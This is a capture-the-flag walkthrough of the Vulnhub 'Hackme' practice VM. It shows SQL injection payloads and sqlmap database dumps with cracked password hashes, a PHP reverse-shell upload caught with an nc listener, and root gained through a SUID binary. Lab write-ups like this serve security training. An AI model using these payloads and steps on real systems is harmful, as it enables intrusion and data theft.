# Vulnhub Hackme


Vulnhub Training -- Hackme

## Knowledge

- sqlmap - SQL Injection Scanner
- webshell - php-reverse-shell.php

## 1. Environment Setup

OVA Download Link：https://download.vulnhub.com/hackme/hackme.ova

Just download it and run in vmware, the environment OS is ubunutu 18.04, so it work well in VMware.

## 2. Reconnaisence

### 1. IP Address

scan ip:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/proxy]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
172.16.86.146	00:0c:29:41:bf:50	VMware, Inc.
172.16.86.254	00:50:56:f4:42:e0	VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.393 seconds (106.98 hosts/sec). 4 responded
```

Target IP is 172.16.86.146.

### 2. Port Info

scan target port info:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/proxy]
└─$ nmap -T4 -A -Pn 172.16.86.146
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-09 06:46 EST
Nmap scan report for 172.16.86.146
Host is up (0.0022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)
|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)
|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.34 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

Avaliable ports:

| port | service  |
| ---- | -------- |
| 22   | ssh      |
| 80   | http web |

### 3. Web Directory

The ssh service need username and password, but we don't have yet. Access the web:

![image-20231109194915243](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091949319.png)

scan the web directory with dirb:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ dirb http://172.16.86.146/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Nov  9 07:25:37 2023
URL_BASE: http://172.16.86.146/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.86.146/ ----
+ http://172.16.86.146/index.php (CODE:200|SIZE:100)
+ http://172.16.86.146/server-status (CODE:403|SIZE:301)
==> DIRECTORY: http://172.16.86.146/uploads/

---- Entering directory: http://172.16.86.146/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Nov  9 07:25:41 2023
DOWNLOADED: 4612 - FOUND: 2
```

## 3. Exploit

### 1. SQL Injection Vulnerability

The default page is `login.php`, a normal login page. And we can register a user through `Sign up now` link:

![image-20231109195022737](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091950808.png)

We signed up a user named 123456 and password is 123456, and the login:

![image-20231109195103800](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091951877.png)

It's a search webpage, we can do some search action through search link. And we can test and guess, maybe it will have some vulns here. Capture the traffic via burpsuite:

![image-20231109195307589](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091953661.png)

The page return diffrent results based on search's values, and maybe has a SQL Injection here.

Detet it with sqlmap.

**Frist Way**

```shell
# export burp suite request data into sql.txt
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ cat sql.txt                                          
POST /welcome.php HTTP/1.1
Host: 172.16.86.146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://172.16.86.146
Connection: close
Referer: http://172.16.86.146/welcome.php
Cookie: PHPSESSID=cdc3pcm34pd30kqr7otellt6f4
Upgrade-Insecure-Requests: 1

search=123


# execute sqlmap with sql.txt
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sqlmap -r sql.txt --dbs --batch                      
        ___
       __H__                                                                                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.7.10#stable}                                                                                                                                                            
|_ -| . [)]     | .'| . |                                                                                                                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:08:48 /2023-11-09/

[07:08:48] [INFO] parsing HTTP request from 'sql.txt'
[07:08:48] [INFO] resuming back-end DBMS 'mysql' 
[07:08:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=123' AND (SELECT 3657 FROM (SELECT(SLEEP(5)))qbbB) AND 'stnZ'='stnZ

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=123' UNION ALL SELECT CONCAT(0x716b6b6a71,0x527466504e7a64425265527145465152684576647849594d6b4d4176444b6f616a76784d52667265,0x717a716271),NULL,NULL-- -
---
[07:08:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.10 (cosmic)
web application technology: Apache 2.4.34
back-end DBMS: MySQL >= 5.0.12
[07:08:48] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapphacking

[07:08:48] [INFO] fetched data logged to text files under '/home/v4ler1an/.local/share/sqlmap/output/172.16.86.146'

[*] ending @ 07:08:48 /2023-11-09/

```

**Second Way**

```shell
# execuet sqlmap with -u and --data to specify the parameter
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sqlmap -u "http://172.16.86.146/welcome.php" --data "search=1" --dbs --batch 
        ___
       __H__                                                                                                                                                                                         
 ___ ___[']_____ ___ ___  {1.7.10#stable}                                                                                                                                                            
|_ -| . [']     | .'| . |                                                                                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:10:01 /2023-11-09/

[07:10:01] [INFO] resuming back-end DBMS 'mysql' 
[07:10:01] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.16.86.146/login.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=osmmjlnrmbg...5bv57m2d9p'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=123' AND (SELECT 3657 FROM (SELECT(SLEEP(5)))qbbB) AND 'stnZ'='stnZ

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=123' UNION ALL SELECT CONCAT(0x716b6b6a71,0x527466504e7a64425265527145465152684576647849594d6b4d4176444b6f616a76784d52667265,0x717a716271),NULL,NULL-- -
---
[07:10:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.10 (cosmic)
web application technology: Apache 2.4.34, PHP
back-end DBMS: MySQL >= 5.0.12
[07:10:01] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapphacking

[07:10:01] [INFO] fetched data logged to text files under '/home/v4ler1an/.local/share/sqlmap/output/172.16.86.146'

[*] ending @ 07:10:01 /2023-11-09/

```

As we can see, the SQL Injection Vulnerability is availiable, and we can find a database named `webapphacking`. We can dump the data from it:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sqlmap -u "http://172.16.86.146/welcome.php" --data "search=1" -D webapphacking --dump-all --batch
        ___
       __H__                                                                                                                                                                                         
 ___ ___[)]_____ ___ ___  {1.7.10#stable}                                                                                                                                                            
|_ -| . [(]     | .'| . |                                                                                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:12:45 /2023-11-09/

[07:12:45] [INFO] resuming back-end DBMS 'mysql' 
[07:12:45] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.16.86.146/login.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=rp454e7tjm4...1nuoo7luru'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=123' AND (SELECT 3657 FROM (SELECT(SLEEP(5)))qbbB) AND 'stnZ'='stnZ

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=123' UNION ALL SELECT CONCAT(0x716b6b6a71,0x527466504e7a64425265527145465152684576647849594d6b4d4176444b6f616a76784d52667265,0x717a716271),NULL,NULL-- -
---
[07:12:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.10 (cosmic)
web application technology: PHP, Apache 2.4.34
back-end DBMS: MySQL >= 5.0.12
[07:12:45] [INFO] fetching tables for database: 'webapphacking'
[07:12:45] [INFO] fetching columns for table 'books' in database 'webapphacking'
[07:12:45] [INFO] fetching entries for table 'books' in database 'webapphacking'
Database: webapphacking
Table: books
[15 entries]
+----+-------+-----------------------------+
| id | price | bookname                    |
+----+-------+-----------------------------+
| 1  | 50    | Anonymous Hackers TTP       |
| 2  | 80    | CISSP Guide                 |
| 3  | 30    | Security+                   |
| 4  | 45    | Practical WebApp Hacking    |
| 5  | 20    | All about Kali Linux        |
| 6  | 10    | Linux OS                    |
| 7  | 10    | Windows OS                  |
| 8  | 190   | IoT Exploitation            |
| 9  | 90    | ZigBee Wireless Hacking     |
| 10 | 50    | JTAG UART Hardware Hacking  |
| 11 | 40    | Container Breakout          |
| 12 | 240   | OSCP/OSCE Guide             |
| 13 | 40    | CREST CRT                   |
| 14 | 88    | Creating your vulnerable VM |
| 15 | 48    | OSINT                       |
+----+-------+-----------------------------+

[07:12:45] [INFO] table 'webapphacking.books' dumped to CSV file '/home/v4ler1an/.local/share/sqlmap/output/172.16.86.146/dump/webapphacking/books.csv'
[07:12:45] [INFO] fetching columns for table 'users' in database 'webapphacking'
[07:12:45] [INFO] fetching entries for table 'users' in database 'webapphacking'
[07:12:45] [INFO] recognized possible password hashes in column 'pasword'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[07:12:45] [INFO] using hash method 'md5_generic_passwd'
[07:12:45] [INFO] resuming password 'hello' for hash '5d41402abc4b2a76b9719d911017c592'
[07:12:45] [INFO] resuming password 'commando' for hash '6269c4f71a55b24bad0f0267d9be5508'
[07:12:45] [INFO] resuming password 'p@ssw0rd' for hash '0f359740bd1cda994f8b55330c86d845'
[07:12:45] [INFO] resuming password 'testtest' for hash '05a671c66aefea124cc08b76ea6d30bb'
[07:12:45] [INFO] resuming password '123456' for hash 'e10adc3949ba59abbe56e057f20f883e'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[07:12:45] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[07:12:45] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[07:12:45] [WARNING] multiprocessing hash cracking is currently not supported on this platform
Database: webapphacking                                                                                                                                                                             
Table: users
[7 entries]
+----+--------------+------------+----------------+---------------------------------------------+
| id | name         | user       | address        | pasword                                     |
+----+--------------+------------+----------------+---------------------------------------------+
| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |
| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |
| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |
| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |
| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 13 | <blank>      | 123456     | <blank>        | e10adc3949ba59abbe56e057f20f883e (123456)   |
+----+--------------+------------+----------------+---------------------------------------------+

[07:13:12] [INFO] table 'webapphacking.users' dumped to CSV file '/home/v4ler1an/.local/share/sqlmap/output/172.16.86.146/dump/webapphacking/users.csv'
[07:13:12] [INFO] fetched data logged to text files under '/home/v4ler1an/.local/share/sqlmap/output/172.16.86.146'

[*] ending @ 07:13:12 /2023-11-09/

```

We can find a superadmin user in table users, and decrpyt the md5 password in website:

![image-20231109201440559](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311092014777.png)

Now, we have the user named `superadmin` and password is `Uncrackable`.

We use the user to login webpage:

![image-20231109201820915](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311092018136.png)

### 2. File Upload Vulnerability

We can find a file upload method in the superamin's page. We know that the website can execute php file, so we can upload a php webshell.

Now, we user `/usr/share/webshells/php/php-reverse-shell.php`, modify the `$ip` 's value with kali ip, and upload it to target;

![image-20231109203035152](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311092030397.png)

The shell.php 's web path should be http://172.16.86.146/upload/shell.php, so we can access the shell.php with it. 

First, listen on kali with nc, and access the shell.php:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nc -lvp 12345
listening on [any] 12345 ...
id
172.16.86.146: inverse host lookup failed: Unknown host
connect to [172.16.86.138] from (UNKNOWN) [172.16.86.146] 45440
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:30:46 up  1:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/
$ uname -a
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 4.18.0-16-generic (buildd@lcy01-amd64-022) (gcc version 8.2.0 (Ubuntu 8.2.0-7ubuntu1)) #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019
```

## 4. Privilege Escalation

The reverse shell has not root privilege, so we need to get root through some methods.

```shell
$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 40152 Jun 14  2022 /snap/core/16202/bin/mount
... ...
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 157192 Aug 23  2018 /usr/bin/sudo
-rwsr--r-x 1 root root 8472 Mar 26  2019 /home/legacy/touchmenot
-rwsr-xr-x 1 root root 47184 Oct 15  2018 /bin/mount
... ...
```

We can find a `touchmenot` with SUID, we can execute it to get root:

```shell
$ pwd 
/home/legacy
$ ls
touchmenot
$ ls -la
total 20
drwxr-xr-x 2 root root 4096 Mar 26  2019 .
drwxr-xr-x 4 root root 4096 Mar 26  2019 ..
-rwsr--r-x 1 root root 8472 Mar 26  2019 touchmenot
$ ./touchmenot
id
uid=0(root) gid=33(www-data) groups=33(www-data)
ls /root
snap
```

Has no root file in root path, so that's all.

## Notes

Nothing. See you next time:)

